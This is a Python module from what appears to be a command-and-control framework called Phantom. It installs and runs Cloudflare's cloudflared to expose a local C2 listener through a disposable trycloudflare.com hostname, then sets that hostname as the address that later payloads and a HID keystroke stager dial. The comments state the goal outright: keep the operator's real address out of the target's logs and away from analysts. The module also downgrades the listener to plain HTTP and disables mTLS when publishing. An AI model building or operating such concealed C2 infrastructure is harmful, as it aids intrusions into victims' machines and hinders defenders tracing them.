"""tunnel.py — the public hop, owned by Phantom instead of by the operator.

Why this exists: a HID board types an address, and whatever it types is on
screen and in the target's logs. Putting the operator's own IP there means the
address is burned the moment it is delivered. The fix is not to obfuscate the
address (a hash cannot be dialled, and anything the target reconstructs an
analyst reconstructs too) but to type an address that is NOT ours: a
throwaway public hop that forwards to the local listener.

Tailscale does not solve this — it requires the TARGET to join the tailnet.
A quick tunnel does: `cloudflared` runs here, outbound only, and the target
makes a plain HTTPS request to Cloudflare's edge. Nothing is installed or
configured on the target, and our address never appears in its traffic.

This module is the operator-facing half: find/install the binary, start the
tunnel, read back the assigned hostname, and (through `c2.front`) make the
next generated artefact use it. `start()` deliberately performs the listener
restart too, because an HTTPS listener behind a tunnel cannot work: the edge
terminates TLS with a certificate it owns and forwards PLAIN HTTP to us.
"""
from __future__ import annotations

import os
import platform
import re
import subprocess
import tarfile
import sys
import threading
import time
from pathlib import Path
from typing import Optional, Tuple

PROJECT_ROOT = Path(__file__).resolve().parents[2]

#: Where a managed binary lives. Under data/ (gitignored) so an install never
#: becomes a repository file, and so `tunnel stop/start` finds the same copy.
BIN_DIR = PROJECT_ROOT / "data" / "bin"

#: The hostname a quick tunnel is published on. Anchored on the scheme and the
#: domain so the banner box cloudflared prints (which contains other URLs)
#: cannot be mistaken for the assignment.
_URL_RE = re.compile(r"https://([a-z0-9][a-z0-9-]{2,60})\.trycloudflare\.com",
                     re.I)

#: How long the assignment may take. Measured: 4-12s on a normal connection;
#: 45s is the point where "slow network" becomes "something is wrong".
START_TIMEOUT_S = 45.0

_RELEASE_URL = ("https://github.com/cloudflare/cloudflared/releases/latest/"
                "download/{asset}")

#: Smallest plausible release. A 404 page or an HTML redirect stub carries the
#: right URL and the wrong size, and an install that "succeeded" with one of
#: those is a tunnel that later refuses to start.
_MIN_INSTALL_BYTES = 1_000_000


def _asset_name() -> str:
    """The release asset for this OS/arch."""
    machine = (platform.machine() or "").lower()
    if sys.platform == "win32":
        return "cloudflared-windows-amd64.exe"
    if sys.platform == "darwin":
        return ("cloudflared-darwin-arm64.tgz" if machine in ("arm64", "aarch64")
                else "cloudflared-darwin-amd64.tgz")
    return ("cloudflared-linux-arm64" if machine in ("arm64", "aarch64")
            else "cloudflared-linux-amd64")


def binary_name() -> str:
    return "cloudflared.exe" if sys.platform == "win32" else "cloudflared"


def find_binary() -> str:
    """Path to a usable cloudflared, or "".

    Order: explicit `PHANTOM_CLOUDFLARED` (an operator pointing at their own
    copy wins), then the managed copy under data/bin, then PATH. Each
    candidate is EXECUTED — a half-downloaded file that answers `--version`
    with an error is not a binary, and pretending it is turns into a tunnel
    that silently never comes up.
    """
    candidates = []
    explicit = str(os.getenv("PHANTOM_CLOUDFLARED", "")).strip()
    if explicit:
        candidates.append(explicit)
    candidates.append(str(BIN_DIR / binary_name()))
    for name in ("cloudflared", "cloudflared.exe"):
        from shutil import which
        found = which(name)
        if found:
            candidates.append(found)
    for path in candidates:
        if path and os.path.isfile(path) and _runs(path):
            return path
    return ""


def _runs(path: str) -> bool:
    try:
        out = subprocess.run([path, "--version"], capture_output=True,
                             timeout=15, text=True)
        return out.returncode == 0 and "cloudflared" in (
            (out.stdout or "") + (out.stderr or "")).lower()
    except Exception:
        return False


def install(timeout: float = 300.0) -> Tuple[str, str]:
    """Download the managed binary. Returns (path, error) — never raises.

    A missing cloudflared must read as one actionable line, not as a
    traceback: the operator is mid-engagement and the tunnel is a delivery
    dependency.
    """
    from urllib.request import urlopen

    BIN_DIR.mkdir(parents=True, exist_ok=True)
    asset = _asset_name()
    url = _RELEASE_URL.format(asset=asset)
    target = BIN_DIR / binary_name()
    tmp = target.with_suffix(target.suffix + ".part")
    try:
        with urlopen(url, timeout=timeout) as resp:
            data = resp.read()
    except Exception as exc:
        return "", f"download failed from {url}: {exc}"
    if len(data) < _MIN_INSTALL_BYTES:
        # A 404 page or a redirect stub has the right URL and the wrong size.
        return "", (f"download from {url} returned {len(data)} bytes — "
                    f"not a binary (asset name {_asset_name()!r})")
    try:
        tmp.write_bytes(data)
        if asset.endswith((".tgz", ".tar.gz")):
            # macOS ships a tarball: writing it out as the executable and
            # chmod-ing it does not produce a runnable binary, so `install`
            # would "succeed" and then every start would say "cloudflared not
            # found" on that platform.
            with tarfile.open(tmp, "r:gz") as archive:
                member = next((m for m in archive.getmembers()
                               if os.path.basename(m.name) == "cloudflared"
                               and m.isfile()), None)
                if member is None:
                    tmp.unlink(missing_ok=True)
                    return "", f"{url} has no cloudflared member to extract"
                blob = archive.extractfile(member).read()
            tmp.write_bytes(blob)
        os.replace(tmp, target)
        if sys.platform != "win32":
            os.chmod(target, 0o755)
    except (OSError, tarfile.TarError) as exc:
        return "", f"could not write {target}: {exc}"
    if not _runs(str(target)):
        return "", f"{target} downloaded but does not run (asset {url})"
    return str(target), ""


def parse_public_url(text: str) -> str:
    """The `https://<name>.trycloudflare.com` a cloudflared line announces."""
    match = _URL_RE.search(text or "")
    return match.group(0) if match else ""


def host_of(public_url: str, port: int = 443) -> str:
    """The `host:port` form `c2.front` expects."""
    name = (public_url or "").strip()
    name = re.sub(r"^https?://", "", name).split("/")[0]
    if not name:
        return ""
    return f"{name}:{int(port)}"


class Tunnel:
    """One running quick tunnel (process + the hostname it was given)."""

    def __init__(self) -> None:
        self.process: Optional[subprocess.Popen] = None
        self.public_url = ""
        self.local_url = ""
        self.error = ""
        self._lines = []

    def running(self) -> bool:
        return bool(self.process and self.process.poll() is None)

    def start(self, local_port: int, local_host: str = "127.0.0.1",
              timeout: float = START_TIMEOUT_S) -> bool:
        """Start the tunnel and wait for the assigned hostname.

        Returns True only once a real `*.trycloudflare.com` line was read: a
        process that is alive but never registered is a tunnel that will not
        answer, and the operator would find out on the target instead.
        """
        self.stop()
        binary = find_binary()
        if not binary:
            self.error = ("cloudflared not found — run `tunnel install` "
                          "(or set PHANTOM_CLOUDFLARED)")
            return False
        self.local_url = f"http://{local_host}:{int(local_port)}"
        cmd = [binary, "tunnel", "--no-autoupdate", "--url", self.local_url]
        if sys.platform == "win32":
            creation = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        else:
            creation = 0
        try:
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, creationflags=creation)
        except Exception as exc:
            self.error = f"could not start cloudflared: {exc}"
            return False

        def _pump():
            for line in (self.process.stdout or []):
                self._lines.append(line.rstrip())
                if not self.public_url:
                    found = parse_public_url(line)
                    if found:
                        self.public_url = found

        threading.Thread(target=_pump, daemon=True).start()
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.public_url:
                return True
            if self.process.poll() is not None:
                self.error = ("cloudflared exited before registering: "
                              + " | ".join(self._lines[-3:]))
                return False
            time.sleep(0.2)
        self.error = (f"no hostname assigned in {int(timeout)}s "
                      f"(last: {' | '.join(self._lines[-2:])})")
        self.stop()
        return False

    def stop(self) -> None:
        proc, self.process = self.process, None
        self.public_url = ""
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=10)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    def tail(self, n: int = 3) -> str:
        return " | ".join(self._lines[-n:]) if self._lines else ""


#: Process-wide handle, so `tunnel status/stop` in the C2 shell and the HID
#: generator can never disagree about which tunnel is up.
_active = Tunnel()


def _shutdown_active() -> None:
    """Never leave a cloudflared orphan behind when Phantom exits.

    The tunnel is a CHILD process, so it outlives the Python that spawned it:
    measured 2026-11-02, two cloudflared.exe were still pubishing
    127.0.0.1:<dead port> after the shells that started them were gone — a
    public hostname pointing at nothing, and one more process on the box
    nobody is tracking. Best effort: exit must never be blocked by this.
    """
    try:
        _active.stop()
    except Exception:
        pass


try:
    import atexit as _atexit
    _atexit.register(_shutdown_active)
except Exception:      # an exit hook is a courtesy, never a hard dependency
    pass


def active() -> Tunnel:
    return _active


def apply_front(public_url: str, port: int = 443) -> str:
    """Point the NEXT generated artefact at the tunnel (via `c2.front`).

    The env var is the documented override `get_c2_front()` reads first, and
    setting it here means one command changes the typed address without
    rewriting the operator's config file — a tunnel is per-engagement and
    disposable, and a stale one in the config would send every later payload
    to a hostname that no longer resolves.
    """
    front = host_of(public_url, port)
    if not front:
        return ""
    os.environ["PHANTOM_C2_FRONT"] = front
    # Persisted as well as exported: env is per-process, and the API server /
    # C2 shell / any second CLI must all generate artefacts for the SAME
    # endpoint. See `state.set_string` for the measured failure this prevents.
    try:
        from phantom.utils.state import set_string
        set_string("PHANTOM_C2_FRONT", front)
    except Exception:
        pass
    return front


def clear_front() -> None:
    os.environ.pop("PHANTOM_C2_FRONT", None)
    try:
        from phantom.utils.state import set_string
        set_string("PHANTOM_C2_FRONT", "")
    except Exception:
        pass


def current_front() -> str:
    value = str(os.getenv("PHANTOM_C2_FRONT", "") or "").strip()
    if value:
        return value
    # another process started this tunnel: the persisted value is the truth
    try:
        from phantom.utils.state import get_string
        return str(get_string("PHANTOM_C2_FRONT", "")).strip()
    except Exception:
        return ""


def _port_free(port: int, host: str = "127.0.0.1") -> bool:
    """Can something bind ``host:port`` right now? (no SO_REUSEADDR)"""
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((host, port))
        return True
    except OSError:
        return False
    finally:
        sock.close()


def _await_port_free(port: int, timeout: float = 8.0) -> bool:
    """Wait for a just-stopped listener to actually release its socket.

    ``C2Server.stop()`` tells the asyncio loop to shut down; the SOCKET is
    closed on that loop's thread a moment later. Re-binding in the same
    breath is a race, not a bug in the OS: measured 2026-11-02, `listeners
    start 8080` (HTTPS) followed by `tunnel start` raised "[Errno 10048]
    port already in use" from the rebind to plain HTTP.
    """
    import time
    deadline = time.time() + max(0.0, float(timeout))
    while time.time() < deadline:
        if _port_free(port):
            return True
        time.sleep(0.1)
    return _port_free(port)


def publish(port: int = 0) -> dict:
    """Make the listener reachable from the outside: listener + tunnel + front.

    ONE implementation for both surfaces (the C2 shell's `tunnel start` and
    the API's ``POST /api/c2/tunnel``): the two must not be able to disagree
    about what a published C2 is, which is exactly the class of bug this
    project keeps finding in the listener/endpoint pair.

    Returns a plain dict — messages included — so a caller can render it as
    text (notifier) or as JSON without re-deriving anything.
    """
    from phantom.core.c2_server import server_instance
    from phantom.utils.state import set_flag, use_mtls

    log: list = []
    alive = bool(server_instance.thread and server_instance.thread.is_alive())
    if not alive:
        return {"ok": False, "messages": log + [
            "the listener is not running: `listeners start` first "
            "(the tunnel only forwards to something that answers)"]}

    port = int(port or getattr(server_instance, "port", 0) or 0)
    if not port:
        return {"ok": False, "messages": log + ["no listener port to publish"]}

    if getattr(server_instance, "use_ssl", False):
        # The edge terminates TLS with a certificate it owns and forwards
        # PLAIN http: an HTTPS listener behind a tunnel is unreachable, not
        # "more secure".
        log.append("listener was HTTPS — restarting as HTTP on 127.0.0.1 "
                   "(the edge terminates TLS)")
        server_instance.stop()
        if use_mtls():
            set_flag("PHANTOM_MTLS_REQUIRED", False)
            log.append("mTLS disabled: the public edge cannot present a "
                       "client certificate. Beacon auth is the payload "
                       "token + per-beacon HMAC.")
        # Wait for the socket to be genuinely free, and never let a bind
        # failure escape: this function's contract is to RETURN a dict, and
        # an escaping RuntimeError killed the interactive C2 shell instead of
        # printing one red line (measured 2026-11-02).
        if not _await_port_free(port):
            return {"ok": False, "messages": log + [
                f"port {port} is still held — the listener did not release "
                f"it, or ANOTHER process owns it (`netstat -ano | "
                f"findstr :{port}` shows the PID). Free the port, or "
                f"restart the listener on one that is free."]}
        try:
            server_instance.start(host="127.0.0.1", port=port, use_ssl=False)
        except RuntimeError as exc:
            return {"ok": False, "messages": log + [
                f"listener could not restart as plain HTTP: {exc}"]}
        if not (server_instance.thread and server_instance.thread.is_alive()):
            return {"ok": False, "messages": log +
                    ["listener failed to restart as HTTP"]}
    elif str(getattr(server_instance, "host", "")) not in ("127.0.0.1", "localhost"):
        log.append(f"listener bound on {server_instance.host}: the tunnel "
                   f"forwards to 127.0.0.1 — make sure they coincide")

    if not find_binary():
        return {"ok": False, "messages": log +
                ["cloudflared not found — run `tunnel install`"]}

    log.append(f"publishing 127.0.0.1:{port} (outbound tunnel only)")
    tun = active()
    if not tun.start(port):
        return {"ok": False, "messages": log +
                [f"tunnel did not come up: {tun.error}"]}
    front = apply_front(tun.public_url, 443)
    log.append(f"tunnel UP: {tun.public_url}")
    log.append(f"c2.front = {front} (next artefact and the HID stager "
               f"dial this, not this box's address)")
    return {"ok": True, "url": tun.public_url, "front": front,
            "listener": f"127.0.0.1:{port}", "messages": log}
